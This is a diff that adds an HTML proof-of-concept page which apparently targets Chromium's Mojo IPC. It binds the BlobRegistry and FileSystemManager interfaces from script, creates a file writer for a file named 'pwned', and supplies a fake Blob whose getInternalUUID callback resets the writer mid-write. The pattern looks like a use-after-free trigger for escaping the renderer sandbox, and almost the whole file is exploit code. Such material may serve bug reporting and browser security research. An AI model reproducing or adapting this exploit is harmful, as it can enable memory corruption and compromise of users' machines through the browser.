@@ -1,0 +1,93 @@
+
+<html>
+  <body>
+    <script src="/mojo_bindings.js"></script>
+    <script src="/third_party/blink/public/mojom/blob/blob_registry.mojom.js"></script>
+    <script src="/third_party/blink/public/mojom/filesystem/file_system.mojom.js"></script>
+    <script>
+(async function poc() {
+  let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
+  Mojo.bindInterface(blink.mojom.BlobRegistry.name,
+                     mojo.makeRequest(blob_registry_ptr).handle, "process");
+
+  function BytesProviderImpl() {
+    this.binding = new mojo.Binding(blink.mojom.BytesProvider, this);
+  }
+
+  BytesProviderImpl.prototype = {
+    requestAsReply: async () => {
+      console.log('requestAsReply');
+    },
+    requestAsStream: async (arg0) => {
+      console.log('requestAsStream');
+    },
+    requestAsFile: async (arg0, arg1, arg2, arg3) => {
+      console.log('requestAsFile');
+    }
+  };
+
+  base_bytes = new BytesProviderImpl();
+  base_bytes_ptr = new blink.mojom.BytesProviderPtr();
+  base_bytes.binding.bind(mojo.makeRequest(base_bytes_ptr));
+
+  let base_blob_element = new blink.mojom.DataElement();
+  base_blob_element.bytes = new blink.mojom.DataElementBytes();
+  base_blob_element.bytes.length = 2;
+  base_blob_element.bytes.embeddedData = [0x41, 0x41];
+  base_blob_element.bytes.data = base_bytes_ptr;
+
+  let base_blob_ptr = new blink.mojom.BlobPtr();
+  let base_blob_req = mojo.makeRequest(base_blob_ptr);
+  blob_registry_ptr.register(base_blob_req, "blob_0", "text/html", "", [base_blob_element]);
+
+  let file_system_manager_ptr = new blink.mojom.FileSystemManagerPtr();
+  Mojo.bindInterface(blink.mojom.FileSystemManager.name,
+                   mojo.makeRequest(file_system_manager_ptr).handle, "process");
+
+  let host_url = new url.mojom.Url();
+  host_url.url = 'http://localhost:7007';
+
+  let open_result = await file_system_manager_ptr.open(host_url, 0);
+  console.log(open_result);
+
+  let file_url = new url.mojom.Url();
+  file_url.url = open_result.rootUrl.url + '/pwned';
+
+  let create_writer_result = await file_system_manager_ptr.createWriter(file_url);
+  console.log(create_writer_result);
+
+  function BlobImpl() {
+    this.binding = new mojo.Binding(blink.mojom.Blob, this);
+  }
+
+  BlobImpl.prototype = {
+    clone: async (arg0) => {
+      console.log('clone');
+    },
+    asDataPipeGetter: async (arg0, arg1) => {
+      console.log("asDataPipeGetter");
+    },
+    readAll: async (arg0, arg1) => {
+      console.log("readAll");
+    },
+    readRange: async (arg0, arg1, arg2, arg3) => {
+      console.log("readRange");
+    },
+    readSideData: async (arg0) => {
+      console.log("readSideData");
+    },
+    getInternalUUID: async (arg0) => {
+      console.log("getInternalUUID");
+      create_writer_result.writer.ptr.reset();
+      return {'uuid': 'blob_0'};
+    }
+  };
+
+  let blob_impl = new BlobImpl();
+  let blob_impl_ptr = new blink.mojom.BlobPtr();
+  blob_impl.binding.bind(mojo.makeRequest(blob_impl_ptr));
+
+  create_writer_result.writer.write(0, blob_impl_ptr);
+})();
+    </script>
+  </body>
